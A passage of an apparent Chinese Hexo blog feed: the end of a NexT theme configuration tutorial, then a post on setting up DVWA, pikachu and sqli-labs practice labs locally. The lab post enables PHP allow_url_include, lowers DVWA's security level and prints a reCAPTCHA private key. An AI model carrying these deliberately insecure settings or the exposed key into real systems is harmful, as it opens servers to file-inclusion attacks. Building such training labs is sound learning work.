为你所使用的语言）。</p><p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code>。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code>，在 <code>menu</code> 字段下添加一项：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> 首页</span><br><span class="line"><span class="symbol">  archives:</span> 归档</span><br><span class="line"><span class="symbol">  categories:</span> 分类</span><br><span class="line"><span class="symbol">  tags:</span> 标签</span><br><span class="line"><span class="symbol">  about:</span> 关于</span><br><span class="line"><span class="symbol">  search:</span> 搜索</span><br><span class="line"><span class="symbol">  commonweal:</span> 公益<span class="number">404</span></span><br><span class="line"><span class="symbol">  something:</span> 有料</span><br></pre></td></tr></table></figure></li><li><p>设定菜单项的图标，对应的字段是 <code>menu_icons</code>。<code>enable</code> 可用于控制是否显示图标，你可以设置成 <code>false</code> 来去掉图标。</p><p>菜单图标配置示例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在菜单图标开启的情况下，如果菜单项与菜单未匹配（没有设置或者无效的 Font Awesome 图标名字） 的情况下，NexT 将会使用 作为图标。</p></li></ol><h2 id="侧栏"><a href="#侧栏" class="headerlink" title="侧栏"></a>侧栏</h2><h3 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <strong>主题配置文件</strong> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p><ol><li><p>设置侧栏的位置，修改 <code>sidebar.position</code> 的值，支持的选项有：</p><ul><li>left - 靠左放置</li><li>right - 靠右放置</li></ul><p>目前仅 Pisces Scheme 支持 <code>position</code> 配置。</p></li><li><p>设置侧栏显示的时机，修改 <code>sidebar.display</code> 的值，支持的选项有：</p><ul><li><code>post</code> - 默认行为，在文章页面（拥有目录列表）时显示</li><li><code>always</code> - 在所有页面中都显示</li><li><code>hide</code> - 在所有页面中都隐藏（可以手动展开）</li><li><code>remove</code> - 完全移除</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sidebar:</span></span><br><span class="line">  <span class="meta"># Sidebar Position, available value: left | right (only for Pisces | Gemini).</span></span><br><span class="line"><span class="symbol">  position:</span> left</span><br><span class="line">  <span class="meta">#position: right</span></span><br><span class="line"></span><br><span class="line">  Sidebar Display, available value (only for Muse | Mist):</span><br><span class="line">  </span><br><span class="line">  <span class="meta">#display: post    <span class="comment">// 默认显示方式</span></span></span><br><span class="line">  <span class="meta">#display: always  <span class="comment">// 一直显示</span></span></span><br><span class="line"><span class="symbol">  display:</span> hide     <span class="comment">// 初始隐藏</span></span><br><span class="line">  <span class="meta">#display: remove  <span class="comment">// 移除侧边栏</span></span></span><br></pre></td></tr></table></figure></li></ol><h3 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a>社交链接</h3><p>打开 <code>themes/next/_config.yml</code> 文件,搜索关键字 <code>social</code> ,然后添加社交站点名称与地址即可。</p><h3 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h3><p>打开 <code>themes/next/_config.yml</code> 文件,搜索关键字 <code>social_icons</code> ，添加社交站点名称（注意大小写）图标，<a href="http://fontawesome.dashgame.com/" target="_blank" rel="noopener">Font Awesome</a>图标地。</p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>avatar</code>,删掉前面的#号,值设置成头像的链接地址。其中，头像的链接地址可以是：</p><div class="table-container"><table><thead><tr><th style="text-align:left">地址</th><th style="text-align:left">值</th></tr></thead><tbody><tr><td style="text-align:left">完整的互联网 URI</td><td style="text-align:left"><code>http://example.com/avatar.png</code></td></tr><tr><td style="text-align:left">站点内的地址</td><td style="text-align:left">将头像放置主题目录下的 <code>source/uploads/</code> （新建 uploads 目录若不存在） 配置为：<code>avatar: /uploads/avatar.png</code>或者 放置在 <code>source/images/</code> 目录下 配置为：<code>avatar: /images/avatar.png</code></td></tr></tbody></table></div><h2 id="添加分类和标签"><a href="#添加分类和标签" class="headerlink" title="添加分类和标签"></a>添加分类和标签</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="生成“分类”页并添加tpye属性"><a href="#生成“分类”页并添加tpye属性" class="headerlink" title="生成“分类”页并添加tpye属性"></a>生成“分类”页并添加tpye属性</h4><p>打开命令行，进入博客所在文件夹。执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new<span class="built_in"> page </span>categories</span><br></pre></td></tr></table></figure><p>成功后会提示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="string">Created:</span> <span class="regexp">~/Documents/</span>blog<span class="regexp">/source/</span>categories/index.md</span><br></pre></td></tr></table></figure><p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">12</span><span class="string">:51:51</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>添加<code>type: &quot;categories&quot;</code>到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">12</span><span class="string">:51:51</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"categories"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">aircrack-ng</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">19</span><span class="string">:35:51</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">虚拟机</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><h4 id="生成“标签”页并添加tpye属性"><a href="#生成“标签”页并添加tpye属性" class="headerlink" title="生成“标签”页并添加tpye属性"></a>生成“标签”页并添加tpye属性</h4><p>打开命令行，进入博客所在文件夹。执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new<span class="built_in"> page </span>tags</span><br></pre></td></tr></table></figure><p>成功后会提示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  <span class="string">Created:</span> <span class="regexp">~/Documents/</span>blog<span class="regexp">/source/</span>tags/index.md</span><br></pre></td></tr></table></figure><p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">10</span><span class="string">:51:06</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>添加<code>type: &quot;tags&quot;</code>到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">10</span><span class="string">:51:06</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"tags"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>打开需要添加标签的文章，为其添加tags属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">aircrack-ng</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-10</span> <span class="number">19</span><span class="string">:35:51</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">虚拟机</span></span><br><span class="line"><span class="attr">tags:</span>   <span class="string">//标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">安全</span>   <span class="string">//在这里!!</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h2 id="不显示全文"><a href="#不显示全文" class="headerlink" title="不显示全文"></a>不显示全文</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>auto_excerpt</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">100</span></span><br></pre></td></tr></table></figure><p><code>enable: true</code>:表示不完全显示</p><p><code>length: 100</code>:表示只显示100字</p><h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><p>编辑 <strong>主题配置文件</strong>， 修改字段 <code>Blog rolls</code></p><p>自己往下填就是了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Blog rolls</span></span><br><span class="line"><span class="symbol">links_title:</span> 友情链接 <span class="meta">#标题</span></span><br><span class="line"><span class="symbol">links_layout:</span> block <span class="meta">#布局，一行一个连接</span></span><br><span class="line"><span class="meta">#links_layout: inline</span></span><br><span class="line"><span class="symbol">links:</span> <span class="meta">#连接</span></span><br><span class="line"><span class="symbol">  baidu:</span> http:<span class="comment">//example.com/</span></span><br><span class="line"><span class="symbol">  google:</span> http:<span class="comment">//example.com/</span></span><br></pre></td></tr></table></figure><h2 id="显示当前浏览进度"><a href="#显示当前浏览进度" class="headerlink" title="显示当前浏览进度"></a>显示当前浏览进度</h2><p>打开 <code>themes/next/_config.yml</code> ,搜索关键字 <code>scrollpercent</code> ,把 <code>false</code> 改为 <code>true</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Scroll percent label in b2t button</span></span><br><span class="line">scrollpercent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果想把 <code>top</code>按钮放在侧边栏,打开 <code>themes/next/_config.yml</code> ,搜索关键字 <code>b2t</code> ,把 <code>false</code> 改为 <code>true</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Back to top in sidebar</span></span><br><span class="line"> b2t: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># Scroll percent label in b2t button</span></span><br><span class="line"> scrollpercent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="统计功能"><a href="#统计功能" class="headerlink" title="统计功能"></a>统计功能</h2><p>在站点的根目录下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>post_wordcount</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/willin/hexo-wordcount</span></span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#字数统计</span></span><br><span class="line">  wordcount: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#预览时间</span></span><br><span class="line">  min2read: <span class="literal">true</span></span><br><span class="line">  <span class="comment">#总字数,显示在页面底部</span></span><br><span class="line">  totalcount: <span class="literal">true</span></span><br><span class="line">  separated_meta: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="加载条"><a href="#加载条" class="headerlink" title="加载条"></a>加载条</h2><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>pace</code>：</p><p>pace改为true</p><p>pace_theme后面选上面#后面中的一个</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Progress bar in the top during page loading.</span></span><br><span class="line">pace: <span class="literal">true</span></span><br><span class="line"><span class="meta"># Themes list:</span></span><br><span class="line"><span class="meta">#pace-theme-big-counter</span></span><br><span class="line"><span class="meta">#pace-theme-bounce</span></span><br><span class="line"><span class="meta">#pace-theme-barber-shop</span></span><br><span class="line"><span class="meta">#pace-theme-center-atom</span></span><br><span class="line"><span class="meta">#pace-theme-center-circle</span></span><br><span class="line"><span class="meta">#pace-theme-center-radar</span></span><br><span class="line"><span class="meta">#pace-theme-center-simple</span></span><br><span class="line"><span class="meta">#pace-theme-corner-indicator</span></span><br><span class="line"><span class="meta">#pace-theme-fill-left</span></span><br><span class="line"><span class="meta">#pace-theme-flash</span></span><br><span class="line"><span class="meta">#pace-theme-loading-bar</span></span><br><span class="line"><span class="meta">#pace-theme-mac-osx</span></span><br><span class="line"><span class="meta">#pace-theme-minimal</span></span><br><span class="line"><span class="meta"># For example</span></span><br><span class="line"><span class="meta"># pace_theme: pace-theme-center-simple</span></span><br><span class="line">pace_theme: pace-theme-center-simple</span><br></pre></td></tr></table></figure><h2 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h2><p>打开 <code>themes/next/_config.yml</code> ，搜索关键字 <code>pace</code>：</p><p>四个选一个,改动true/false</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># three_waves</span></span><br><span class="line"><span class="attr">three_waves:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canvas_lines</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canvas_sphere</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="添加打赏功能"><a href="#添加打赏功能" class="headerlink" title="添加打赏功能"></a>添加打赏功能</h2><p><strong>主题配置文件</strong>，搜索reward关键词，添加打赏的配置信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Reward</span><br><span class="line"># If true, reward would be displayed in every article by default.</span><br><span class="line"># And you can show or hide one article specially through add page variable &#96;reward: true&#x2F;false&#96;.</span><br><span class="line">reward:</span><br><span class="line">  enable: true  &#x2F;&#x2F;默认是false，改为true</span><br><span class="line">  comment: 您的支持是对我最大的鼓励</span><br><span class="line">  wechatpay: &#x2F;images&#x2F;wechatpay.jpg  #图片链接或图片相对路径,当然也可以是绝对路径</span><br><span class="line">  alipay: &#x2F;images&#x2F;alipay.jpg      #同上</span><br></pre></td></tr></table></figure><h2 id="开启版权声明"><a href="#开启版权声明" class="headerlink" title="开启版权声明"></a>开启版权声明</h2><p>打开<strong>主题配置文件</strong>,搜索关键字 post_copyright </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true  &#x2F;&#x2F;默认为false</span><br><span class="line">  license: CC BY-NC-SA 3.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;3.0&#x2F;</span><br></pre></td></tr></table></figure><h2 id="分页问题"><a href="#分页问题" class="headerlink" title="分页问题"></a>分页问题</h2><p>网页往下翻的时候发现一个奇奇怪怪的东西</p><p><img src="Snipaste_2020-04-08_13-41-26.png" alt="Snipaste_2020-04-08_13-41-26"></p><p>这能忍???</p><p>找到<code>themes\next\layout\_partials\pagination.swig</code></p><p>修改代码为</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> page.prev or page.next %&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-variable">&#123;&#123;</span></span><br><span class="line"><span class="template-variable">      paginator(&#123;</span></span><br><span class="line"><span class="template-variable">        prev_text: '&lt;',</span></span><br><span class="line"><span class="template-variable">        next_text: '&gt;',</span></span><br><span class="line"><span class="template-variable">        mid_size: 1</span></span><br><span class="line"><span class="template-variable">      &#125;)</span></span><br><span class="line"><span class="template-variable">    &#125;&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><p>然后就正常了</p><p><img src="Snipaste_2020-04-08_13-45-49.png" alt="Snipaste_2020-04-08_13-45-49"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;next主题配置&quot;&gt;&lt;a href=&quot;#next主题配置&quot; class=&quot;headerlink&quot; title=&quot;next主题配置&quot;&gt;&lt;/a&gt;next主题配置&lt;/h1&gt;&lt;h2 id=&quot;Scheme&quot;&gt;&lt;a href=&quot;#Scheme&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>学习环境搭建</title>
    <link href="https://mercer5.github.io/2020/04/08/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://mercer5.github.io/2020/04/08/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-04-08T05:33:44.000Z</published>
    <updated>2020-08-24T15:30:09.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="学习搭建环境"><a href="#学习搭建环境" class="headerlink" title="学习搭建环境"></a>学习搭建环境</h1><hr><p>最近想学一下安全的一些基本操作,所以搭了几个环境</p><p>在这里记录一下搭建的过程</p><p>尽量详细&gt;&lt;</p><hr><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><ol><li><p>下载phpstudy</p></li><li><p>下载dvwa源码: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p></li><li><p>下载pikachu源码: <a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p></li><li><p>下载sqli-labs源码: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p></li><li><p>安装好phpstudy后,开启服务</p><p><img src="Snipaste_2020-04-07_18-39-55.png" alt="Snipaste_2020-04-07_18-39-55"></p><p>变成这样</p><p><img src="Snipaste_2020-04-07_18-40-23.png" alt="Snipaste_2020-04-07_18-40-23"></p></li><li><p>把下载好的源码解压并拖到拖到phpstudy安装目录下的www中</p></li></ol><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><ol><li>修改<code>DVWA-master/config/config.inc.php.dist</code>的文件名为<code>config.inc.php</code>,并用记事本打开,修改数据库密码为<code>root</code></li></ol><p><img src="Snipaste_2020-04-07_18-46-00.png" alt="Snipaste_2020-04-07_18-46-00"></p><ol><li><p><code>$_DVWA[ &#39;default_security_level&#39; ] = &#39;low&#39;;</code>同一个文件,修改以下默认开启的难度</p></li><li><p>在浏览器输入<code>http://127.0.0.1/DVWA-master/setup.php</code>,单机创建或重置数据库</p><p><img src="Snipaste_2020-04-07_18-48-40.png" alt="Snipaste_2020-04-07_18-48-40"></p><p>​  <img src="Snipaste_2020-04-07_18-48-55.png" alt="Snipaste_2020-04-07_18-48-55"></p></li><li><p>进入登陆界面,输入默认用户名:admin,密码:password,ojbk</p></li><li><p>但是在第三步,一片红红火火恍恍惚惚的,让人有些害怕,所以搞一下</p></li></ol><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol><li><p>reCAPTCHA key：<strong>Missing</strong></p><p><code>DVWA-master/config/config.inc.php</code>文件夹中</p><p>找到下述文段,复制粘贴</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">'6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg'</span><span class="comment">;</span></span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">'6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li><p>PHP function allow_url_include: <strong>Disabled</strong></p><p>网上找到的方法是</p><p><code>DVWA-master/php.ini</code>中,把<code>allow_url_include</code> 设置成<code>on</code></p><p>然后我发现这个已经是on了,那么是哪里错了呢?</p><p>然后就发现了这么一个好东西</p><p><img src="Snipaste_2020-04-08_14-40-35.png" alt="Snipaste_2020-04-08_14-40-35"></p><p>这个可以直接修改<code>phpstudy_pro\Extensions\php</code>里面的配置</p><p>所以这个也改一下,重启phpstudy,ojbk</p><p><strong>注意!!! 修改的是你这个网站所用的配置文件,由于下一个环境的搭建,我把切换成了5.2.17</strong></p></li><li><p>进入SQL Injection页面,报错……</p><p><strong>Parse error</strong>: syntax error, unexpected ‘[‘ in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\sqli_blind\index.php</strong> on line <strong>65</strong></p><p>找到该文件,修改</p><p><code>$num  = mysqli_fetch_row( $result )[0];</code>—&gt;<code>$num  = mysqli_fetch_row( $result );</code></p></li><li><p>PHP function magic_quotes_gpc: <strong>Enabled</strong></p><p>找不到解决办法&gt;&lt;</p><p>网上找到都没用跪了: (</p></li></ol><p>做个小小的补充</p><ul><li><p>难度默认是impossible,记得去<code>DVWA security</code>改<strong>(经过修改后默认是low了)</strong></p><p><img src="Snipaste_2020-04-08_13-15-56.png" alt="Snipaste_2020-04-08_13-15-56"></p></li></ul><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><ol><li><p>用笔记本打开<code>pikachu-master\inc\config.inc.php</code>,修改数据库密码为本机的数据库密码</p><p>如果是<code>root</code>就不用改了</p><p><img src="Snipaste_2020-04-07_19-09-19.png" alt="Snipaste_2020-04-07_19-09-19"></p><p>同理修改一下<code>pikachu-master\pkxss\inc\config.inc.php</code></p></li><li><p>访问<code>http://localhost/pikachu-master/</code></p><p><img src="Snipaste_2020-04-07_19-15-33.png" alt="Snipaste_2020-04-07_19-15-33"></p></li><li><p>ojbk</p></li></ol><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><ol><li><p>打开<code>sqli-labs-master\sql-connections\db-creds.inc</code>文件，将$dbpass参数值修改为root</p><p><img src="Snipaste_2020-04-07_20-19-37.png" alt="Snipaste_2020-04-07_20-19-37"></p></li><li><p>进入<code>http://127.0.0.1/sqli-labs-master/</code>,点击Setup/reset Database for labs</p></li><li><p>但是报错了</p><p><img src="Snipaste_2020-04-07_20-50-54.png" alt="Snipaste_2020-04-07_20-50-54"></p><p>出现这个问题是因为从PHP5.0开始mysql_connect()就不推荐使用了，到PHP7.0就直接被废弃了，如果PHP为7.0及以上版本的话用mysqli_connect()代替</p></li><li><p>所以到phpstudy改一下</p><p><img src="Snipaste_2020-04-07_20-40-37.png" alt="Snipaste_2020-04-07_20-40-37"></p><p><img src="Snipaste_2020-04-07_20-40-00.png" alt="Snipaste_2020-04-07_20-40-00"></p></li><li><p>重新Setup/reset Database for labs一下,出现以下界面</p><p><img src="Snipaste_2020-04-07_20-41-10.png" alt="Snipaste_2020-04-07_20-41-10"></p></li></ol><h2 id="站点目录"><a href="#站点目录" class="headerlink" title="站点目录"></a>站点目录</h2><p>虽然这样之后就可以用了</p><p><code>http://localhost/DVWA-master</code>进入DVWA</p><p><code>http://localhost/pikachu-master/</code>进入pikachu</p><p><code>http://localhost/sqli-labs-master/</code>进入sqli-labs</p><p>但是,每次输入那么多字,烦都烦死了,所以有没有什么方便的方法,搞个站点目录,直接点击进入呢?</p><p>从图中我们发现</p><p><img src="Snipaste_2020-04-07_19-26-46.png" alt="Snipaste_2020-04-07_19-26-46"></p><p>网站的首页是index.php或者index.html</p><p>点开www目录,确实有index.html文件</p><p>所以我们把该文件编辑一下</p><p><del>自己改写的辣鸡代码,就动了以下body和排版,大家可以自己修改一下(跪)</del></p><figure class="highlight 